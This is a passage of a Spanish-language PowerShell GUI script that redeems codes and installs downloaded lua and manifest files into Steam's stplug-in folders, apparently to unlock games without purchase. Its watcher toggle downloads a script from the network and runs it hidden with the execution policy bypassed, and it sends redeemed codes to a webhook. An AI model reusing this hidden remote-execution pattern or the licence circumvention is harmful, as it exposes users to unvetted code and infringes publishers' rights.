$script:subB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:GreenBtnH}else{$script:GreenBtn}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 7
    $b1=New-Object System.Drawing.SolidBrush($bc);$g.FillPath($b1,$p);$b1.Dispose();$p.Dispose()
    $sz=$g.MeasureString((T "canjearBtn"),$script:FntSubmit)
    $tb=New-Object System.Drawing.SolidBrush($script:White)
    $g.DrawString((T "canjearBtn"),$script:FntSubmit,$tb,($s.Width-$sz.Width)/2,($s.Height-$sz.Height)/2);$tb.Dispose()
})
$script:subB.Add_Click({
    $code=$txtC.Text.Trim()
    if([string]::IsNullOrEmpty($code)){$lblR.ForeColor=$script:Red;$lblR.Text=T "errorCodigo";[System.Windows.Forms.Application]::DoEvents();return}
    $lblR.ForeColor=$script:Yellow;$lblR.Text="Conectando con servidor..."
    [System.Windows.Forms.Application]::DoEvents()
    try {
        $body = @{code=$code;client_id=$script:clientId} | ConvertTo-Json
        $lastErr = $null
        for ($attempt = 0; $attempt -lt 3; $attempt++) {
            try {
                if ($attempt -gt 0) { Update-ServerUrl; Start-Sleep -Seconds 1 }
                $resp = Invoke-RestMethod -Uri "$($script:serverUrl)/api/redeem-code" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop
                $lastErr = $null
                break
            } catch { $lastErr = $_ }
        }
        if ($lastErr) { throw $lastErr }
        if (-not $resp.ok) { throw $resp.err }
        $links = @($resp.links); $duration = [int]$resp.duration
        if ($links.Count -eq 0) { throw "El codigo no contiene links." }
        Send-Webhook $code ($links -join "`n")
        $expDate = if ($duration -gt 0) { (Get-Date).AddSeconds($duration) } else { $null }
        $steamRoot = Get-SteamPath
        $successCount=0; $total=$links.Count; $errors=@()
        foreach ($mfUrl in $links) {
            $gameName = [System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2])
            if ($gameName) { $gameName = $gameName -replace '%[0-9a-fA-F]{2}', '' }
            $lblR.Text = "($($successCount+1)/$total) $gameName"; [System.Windows.Forms.Application]::DoEvents()
            $zipFile = Join-Path $env:TEMP "fix_$(Get-Random).zip"
            try {
                Download-MediaFire $mfUrl $zipFile
                $installResult = Extract-AndInstall $zipFile $gameName $expDate
                # Always save to timers file (permanent = expires in 1 year)
                $timerExp = if ($expDate) { $expDate } else { (Get-Date).AddYears(1) }
                $timers = Get-ActiveTimers
                $internetNow = Get-InternetTime
                $timers += @{redeem_code=$code;duration=$duration;expires_at=$timerExp.ToString("o");internet_created_at=$(if($internetNow){$internetNow.ToString("o")}else{$null});game_name=$gameName;steam_root=$steamRoot;lua_files=@($installResult.lua);manifest_files=@($installResult.manifest)}
                Save-Timers $timers
                $script:activeCodes.Add(@{Code=$code;Game=$gameName;ActivatedAt=(Get-Date);ExpiresAt=$(if($expDate){$expDate}else{(Get-Date).AddYears(1)});Duration=$duration})|Out-Null
                $successCount++
            } catch { $errors+="$gameName : $($_.Exception.Message)"; Write-ErrorLog "Download $gameName" $_ }
            Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
        }
        if ($successCount -gt 0) {
            $lblR.ForeColor=$script:Green; $lblR.Text="$successCount de $total juegos activados"
            if ($duration -gt 0 -and $expDate) { Start-Countdown $duration $expDate ($links[0]) }
            $script:rp.Invalidate(); Refresh-Codes
            [System.Windows.Forms.MessageBox]::Show("$successCount de $total juegos activados correctamente.","Listo","OK","Information")
        } else { throw "No se pudo activar ningun juego.`n$($errors -join '; ')" }
    } catch {
        Write-ErrorLog "Canjeo" $_; $lblR.ForeColor=$script:Red
        $errMsg = $_.Exception.Message
        if ($_.Exception -is [System.Net.WebException]) {
            $httpResp = $_.Exception.Response
            if ($httpResp -and [int]$httpResp.StatusCode -eq 502) { $errMsg = "El servidor esta offline (502). Avisa al admin para que reinicie el tunel." }
            elseif ($_.Exception.Message -match "Unable to connect|NameResolutionFailure") { $errMsg = "No se pudo conectar al servidor. Revisa tu internet." }
            elseif ($_.Exception.Message -match "Timeout") { $errMsg = "El servidor no respondio a tiempo. Intenta de nuevo." }
        }
        $lblR.Text="Error: $errMsg"
        [System.Windows.Forms.MessageBox]::Show("Error: $errMsg","Error","OK","Error")
    }
})
$script:rp.Controls.Add($script:subB)
$txtC.Add_KeyDown({param($s,$e2);if($e2.KeyCode -eq 'Return'){$script:subB.PerformClick();$e2.Handled=$true;$e2.SuppressKeyPress=$true}})

$lblR=New-Object System.Windows.Forms.Label
$lblR.Text="";$lblR.Font=$FntSub;$lblR.ForeColor=$Gray;$lblR.BackColor=$BG
$lblR.Location=New-Object System.Drawing.Point($PAD,108);$lblR.Size=New-Object System.Drawing.Size($CW,16)
$script:rp.Controls.Add($lblR)

$div=New-Object BufferedPanel;$div.Location=New-Object System.Drawing.Point($PAD,130)
$div.Size=New-Object System.Drawing.Size($CW,1);$div.BackColor=$CardBorder
$script:rp.Controls.Add($div)

$script:codesT=New-Object System.Windows.Forms.Label
$script:codesT.Text=T "codigosActivos"
$script:codesT.Font=$FntSect;$script:codesT.ForeColor=$White;$script:codesT.BackColor=$BG
$script:codesT.AutoSize=$true;$script:codesT.Location=New-Object System.Drawing.Point($PAD,138)
$script:rp.Controls.Add($script:codesT)

$cBadge=New-Object System.Windows.Forms.Label
$cBadge.Font=$FntCodeSt;$cBadge.ForeColor=$Cyan;$cBadge.BackColor=$BG
$cBadge.AutoSize=$true;$cBadge.Location=New-Object System.Drawing.Point(170,144)
$script:rp.Controls.Add($cBadge)

$clH=($FH-$CY)-170
$script:clp=New-Object BufferedPanel
$script:clp.Location=New-Object System.Drawing.Point($PAD,164)
$script:clp.Size=New-Object System.Drawing.Size($CW,$clH);$script:clp.BackColor=$BG
$script:clp.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $codes=$script:activeCodes;$cBadge.Text="($($codes.Count))"
    if($codes.Count -eq 0){
        $p=New-RR 0 0 ($s.Width-1) 60 8
        $bg2=New-Object System.Drawing.SolidBrush($script:CardBG);$bp=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($bg2,$p);$g.DrawPath($bp,$p);$bg2.Dispose();$bp.Dispose();$p.Dispose()
        $gb2=New-Object System.Drawing.SolidBrush($script:Gray)
        $f1=New-Object System.Drawing.Font("Bahnschrift",9.5)
        $msg=T "sinCodigos";$msz=$g.MeasureString($msg,$f1)
        $g.DrawString($msg,$f1,$gb2,($s.Width-$msz.Width)/2,12)
        $f2=New-Object System.Drawing.Font("Segoe UI",8)
        $msg2=T "sinCodigosSub";$msz2=$g.MeasureString($msg2,$f2)
        $g.DrawString($msg2,$f2,$gb2,($s.Width-$msz2.Width)/2,33)
        $gb2.Dispose();$f1.Dispose();$f2.Dispose();return
    }
    $ch2=58;$gp2=6;$yP=0
    foreach($c in $codes){
        $isPermanent = $c.Duration -eq 0
        if($isPermanent){$st="Permanente";$sc=$script:Green}
        else{
            $now=Get-Date;$exp=$c.ExpiresAt
            if($exp){
                $dl=[int]([math]::Ceiling(($exp-$now).TotalDays))
                if($dl -le 0){$st=T "expirado";$sc=$script:Red}
                elseif($dl -le 3){$st="$(T 'expiraEn') $dl $(if($dl-ne 1){T 'dias'}else{T 'dia'})";$sc=$script:Orange}
                elseif($dl -le 7){$st="$(T 'expiraEn') $dl $(T 'dias')";$sc=$script:Yellow}
                else{$st="$(T 'activo') - $dl $(T 'dias')";$sc=$script:Green}
            } else {$st=T "activo";$sc=$script:Green}
        }
        $p2=New-RR 0 $yP ($s.Width-1) $ch2 8
        $bg3=New-Object System.Drawing.SolidBrush($script:CardBG);$bp2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($bg3,$p2);$g.DrawPath($bp2,$p2);$bg3.Dispose();$bp2.Dispose();$p2.Dispose()
        $dtBr=New-Object System.Drawing.SolidBrush($sc);$g.FillEllipse($dtBr,12,($yP+12),8,8);$dtBr.Dispose()
        $ctb=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($c.Code,$script:FntCodeT,$ctb,28,($yP+8));$ctb.Dispose()
        $gtb=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($c.Game,$script:FntCodeS,$gtb,28,($yP+26));$gtb.Dispose()
        $expStr = if($c.ExpiresAt){$c.ExpiresAt.ToString('dd/MM/yyyy')}else{'--/--/----'}
        $etb=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString("$(T 'expira') $expStr",$script:FntCodeS,$etb,28,($yP+40));$etb.Dispose()
        $stb=New-Object System.Drawing.SolidBrush($sc);$stsz=$g.MeasureString($st,$script:FntCodeSt)
        $g.DrawString($st,$script:FntCodeSt,$stb,($s.Width-$stsz.Width-12),($yP+10));$stb.Dispose()
        $yP+=$ch2+$gp2
    }
})
$script:rp.Controls.Add($script:clp)
$form.Controls.Add($script:rp)

# Ã¢â€â‚¬Ã¢â€â‚¬ CONFIG VIEW Ã¢â€â‚¬Ã¢â€â‚¬
$script:sp=New-Object BufferedPanel
$script:sp.Location=New-Object System.Drawing.Point(0,$CY)
$script:sp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:sp.BackColor=$BG;$script:sp.Visible=$false

$script:sBack=New-Object BufferedPanel
$script:sBack.Location=New-Object System.Drawing.Point($PAD,8)
$script:sBack.Size=New-Object System.Drawing.Size(36,36);$script:sBack.BackColor=$BG
$script:sBack.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sBack.Tag=@{Hover=$false}
$script:sBack.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sBack.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sBack.Add_Click({Switch-FromConfig})
$script:sBack.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:sp.Controls.Add($script:sBack)

$script:sTitle=New-Object System.Windows.Forms.Label
$script:sTitle.Text=T "config"
$script:sTitle.Font=$script:FntRedeemTitle
$script:sTitle.ForeColor=$White;$script:sTitle.BackColor=$BG;$script:sTitle.AutoSize=$true
$script:sTitle.Location=New-Object System.Drawing.Point(([int]$PAD+42),14)
$script:sp.Controls.Add($script:sTitle)

# Helper to create config option buttons
$sY=56
function New-CfgBtn([int]$y,[string]$txt,[string]$sub,[scriptblock]$click){
    $pn=New-Object BufferedPanel
    $pn.Location=New-Object System.Drawing.Point($PAD,$y)
    $pn.Size=New-Object System.Drawing.Size($CW,50);$pn.BackColor=$BG
    $pn.Cursor=[System.Windows.Forms.Cursors]::Hand;$pn.Tag=@{Hover=$false;Txt=$txt;Sub=$sub}
    $pn.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
    $pn.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
    $pn.Add_Click($click)
    $pn.Add_Paint({param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
        $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
        $tw=New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($n.Txt,$script:FntCard,$tw,14,7);$tw.Dispose()
        $sw=New-Object System.Drawing.SolidBrush($script:Gray)
        $g.DrawString($n.Sub,$script:FntSub,$sw,14,27);$sw.Dispose()
        $ab=New-Object System.Drawing.SolidBrush($script:Cyan)
        $asz=$g.MeasureString(">",$script:FntArrow)
        $g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,($s.Height-$asz.Height)/2);$ab.Dispose()
    })
    return $pn
}

# Watcher toggle (custom paint for dynamic state)
$script:sWatcher=New-Object BufferedPanel
$script:sWatcher.Location=New-Object System.Drawing.Point($PAD,$sY)
$script:sWatcher.Size=New-Object System.Drawing.Size($CW,50);$script:sWatcher.BackColor=$BG
$script:sWatcher.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sWatcher.Tag=@{Hover=$false}
$script:sWatcher.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sWatcher.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sWatcher.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $we=$script:watcherEnabled
    $wp=$script:watcherProcess
    $he=if($wp){try{$wp.Refresh();$wp.HasExited}catch{$false}}else{$true}
    $wOn=$we -and $wp -and -not $he
    $st=if($wOn){(T "watcherOn")}else{(T "watcherOff")}
    $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
    $sub=if($wOn){"Click para desactivar el watcher"}else{"Click para activar el watcher  [$($we)/$($wp -ne $null)/$($he)]"}
    $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
    $clr=if($wOn){$script:Green}else{$script:Red}
    $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-24),16,10,10);$dot.Dispose()
    $ab=New-Object System.Drawing.SolidBrush($script:Cyan)
    $asz=$g.MeasureString(">",$script:FntArrow);$g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,18);$ab.Dispose()
})
$script:sWatcher.Add_Click({
    $wRunning=$script:watcherProcess -and -not $script:watcherProcess.HasExited
    if ($wRunning) {
        try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(2000) } catch {}
        $script:watcherProcess = $null; $script:watcherEnabled = $false
        try { Add-Content -Path (Join-Path $env:TEMP "bsmap_watcher.log") -Value "[TOGGLE] Watcher detenido por usuario" -Encoding UTF8 } catch {}
    } else {
        try {
            $watcherTemp = Join-Path $env:TEMP "bsmap_watcher.ps1"
            $logPath = Join-Path $env:TEMP "bsmap_watcher.log"
            try { Set-Content -Path $logPath -Value "[TOGGLE] Iniciando watcher..." -Encoding UTF8 -Force -ErrorAction SilentlyContinue } catch {}
            if (-not (Test-Path $watcherTemp) -or ((Get-Date) - (Get-Item $watcherTemp -ErrorAction SilentlyContinue).LastWriteTime).TotalHours -gt 24) {
                Add-Content -Path $logPath -Value "[TOGGLE] Descargando watcher desde GitHub..." -Encoding UTF8 -ErrorAction SilentlyContinue
                Invoke-RestMethod -Uri $script:watcherUrl -UseBasicParsing -TimeoutSec 15 -OutFile $watcherTemp -ErrorAction SilentlyContinue
                if (Test-Path $watcherTemp) { Add-Content -Path $logPath -Value "[TOGGLE] Watcher descargado OK ($(Get-Item $watcherTemp).Length bytes)" -Encoding UTF8 -ErrorAction SilentlyContinue }
                else { Add-Content -Path $logPath -Value "[TOGGLE] ERROR: No se pudo descargar el watcher" -Encoding UTF8 -ErrorAction SilentlyContinue }
            } else { Add-Content -Path $logPath -Value "[TOGGLE] Watcher ya existe en cache" -Encoding UTF8 -ErrorAction SilentlyContinue }
            if (Test-Path $watcherTemp) {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "powershell.exe"
                $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherTemp`""
                $psi.WindowStyle = "Hidden";$psi.CreateNoWindow = $true;$psi.UseShellExecute = $false
                $script:watcherProcess = [System.Diagnostics.Process]::Start($psi)
                $script:watcherEnabled = $true
                Add-Content -Path $logPath -Value "[TOGGLE] Proceso lanzado (PID=$($script:watcherProcess.Id))" -Encoding UTF8 -ErrorAction SilentlyContinue
            }
        } catch { Write-ErrorLog "Toggle watcher on" $_; Add-Content -Path (Join-Path $env:TEMP "bsmap_watcher.log") -Value "[TOGGLE] ERROR: $($_.Exception.Message)" -Encoding UTF8 -ErrorAction SilentlyContinue }
    }
    $script:sWatcher.Invalidate()
})
$script:sp.Controls.Add($script:sWatcher)

# Borrar historial
$script:sHist=New-CfgBtn ($sY+60) (T "borrarHist") (T "borrarHistSub") {
    if ([System.Windows.Forms.MessageBox]::Show("Se eliminaran todos los codigos del registro.`nContinuar?","Borrar historial","YesNo","Warning") -ne "Yes") { return }
    Save-Timers @(); $script:activeCodes.Clear()
    try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Force -ErrorAction SilentlyContinue } catch {}
    Sync-ActiveCodesFromTimers
    Refresh-Codes; $script:rp.Invalidate()
    [System.Windows.Forms.Application]::DoEvents()
    [System.Windows.Forms.MessageBox]::Show((T "histBorradoMsg"),(T "histBorrado"),"OK","Information")
}
$script:sp.Controls.Add($script:sHist)

# LIMPIEZA: kill processes + remove luas + clear registry
$script:sKill=New-CfgBtn ($sY+120) (T "limpieza") (T "limpiezaSub") {
    if ([System.Windows.Forms.MessageBox]::Show("LIMPIEZA TOTAL`n`nSe detendran procesos, se eliminaran todos los luas y se borrara el registro.`nContinuar?","LIMPIEZA","YesNo","Warning") -ne "Yes") { return }
    if ($script:watcherProcess -and -not $script:watcherProcess.HasExited) { try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(2000) } catch {} }
    $script:watcherProcess = $null; $script:watcherEnabled = $false
    if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { if ($j.job) { Remove-Job $j.job -Force -ErrorAction SilentlyContinue } } catch {} } }
    try { if ($script:fixesJob) { Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } } catch {}
    $steamRoot = Get-SteamPath
    if ($steamRoot) {
        $paths = @((Join-Path $steamRoot "config\stplug-in"), (Join-Path $steamRoot "config\lua"), (Join-Path $steamRoot "config\depotcache"))
        foreach ($d in $paths) { if (Test-Path $d) { try { Get-ChildItem $d -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {} } }
    }
    $libs = Get-SteamLibraries
    foreach ($lb in $libs) {
        $paths2 = @((Join-Path $lb "config\stplug-in"), (Join-Path $lb "config\lua"), (Join-Path $lb "config\depotcache"))
        foreach ($d in $paths2) { if (Test-Path $d) { try { Get-ChildItem $d -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch {} } }
    }
    Save-Timers @(); $script:activeCodes.Clear()
    try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Force -ErrorAction SilentlyContinue } catch {}
    Sync-ActiveCodesFromTimers; Refresh-Codes; $script:rp.Invalidate(); $script:sWatcher.Invalidate()
    [System.Windows.Forms.Application]::DoEvents()
    [System.Windows.Forms.MessageBox]::Show("Limpieza completada.`nProcesos detenidos, luas eliminados, registro borrado.","LIMPIEZA","OK","Information")
}
$script:sp.Controls.Add($script:sKill)

# Visitar pagina web link at bottom
$sWeb=New-Object System.Windows.Forms.Label
$sWeb.Text="Visitar sitio oficial ->"
$sWeb.Font=$FntSub;$sWeb.ForeColor=$script:Cyan;$sWeb.BackColor=$BG;$sWeb.AutoSize=$true
$sWeb.Cursor=[System.Windows.Forms.Cursors]::Hand
$sWeb.Location=New-Object System.Drawing.Point($PAD,($sY+190))
$sWeb.Add_Click({Start-Process "https://github.com/bastisayes/Fixes-steam"})
$script:sp.Controls.Add($sWeb)

# Watcher log viewer
$script:sLogLabel=New-Object System.Windows.Forms.Label
$script:sLogLabel.Text="Log del Watcher:"
$script:sLogLabel.Font=$FntSub;$script:sLogLabel.ForeColor=$script:Gray;$script:sLogLabel.BackColor=$BG
$script:sLogLabel.AutoSize=$true
$script:sLogLabel.Location=New-Object System.Drawing.Point($PAD,($sY+220))
$script:sp.Controls.Add($script:sLogLabel)

$script:sLogBox=New-Object System.Windows.Forms.TextBox
$script:sLogBox.Location=New-Object System.Drawing.Point($PAD,($sY+240))
$script:sLogBox.Size=New-Object System.Drawing.Size($CW,180)
$script:sLogBox.Multiline=$true;$script:sLogBox.ReadOnly=$true
$script:sLogBox.ScrollBars="Vertical"
$script:sLogBox.BackColor=$InputBG;$script:sLogBox.ForeColor=$White
$script:sLogBox.Font=New-Object System.Drawing.Font("Consolas",8.5)
$script:sLogBox.BorderStyle="FixedSingle"
$script:sp.Controls.Add($script:sLogBox)

# Timer to refresh log every 2 seconds
$script:watcherLogTimer=New-Object System.Windows.Forms.Timer
$script:watcherLogTimer.Interval=2000
$script:watcherLogTimer.Add_Tick({
    try {
        $logPath = Join-Path $env:TEMP "bsmap_watcher.log"
        if (Test-Path $logPath) {
            $content = Get-Content $logPath -Raw -ErrorAction SilentlyContinue
            if ($content) {
                # Show last ~30 lines to keep it manageable
                $lines = $content -split "`r?`n"
                if ($lines.Count -gt 30) { $lines = $lines[-30..-1] }
                $newText = $lines -join "`r`n"
                if ($script:sLogBox.Text -ne $newText) {
                    $script:sLogBox.Text = $newText
                    $script:sLogBox.SelectionStart = $script:sLogBox.Text.Length
                    $script:sLogBox.ScrollToCaret()
                }
            } else { $script:sLogBox.Text = "(Log vacio)" }
        } else { $script:sLogBox.Text = "(No existe log - el watcher no escribio nada)`nRuta esperada: $env:TEMP\bsmap_watcher.log" }
    } catch { $script:sLogBox.Text = "Error leyendo log: $($_.Exception.Message)" }
})
$script:watcherLogTimer.Start()

$form.Controls.Add($script:sp)

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  SYSTEM TRAY (NotifyIcon)
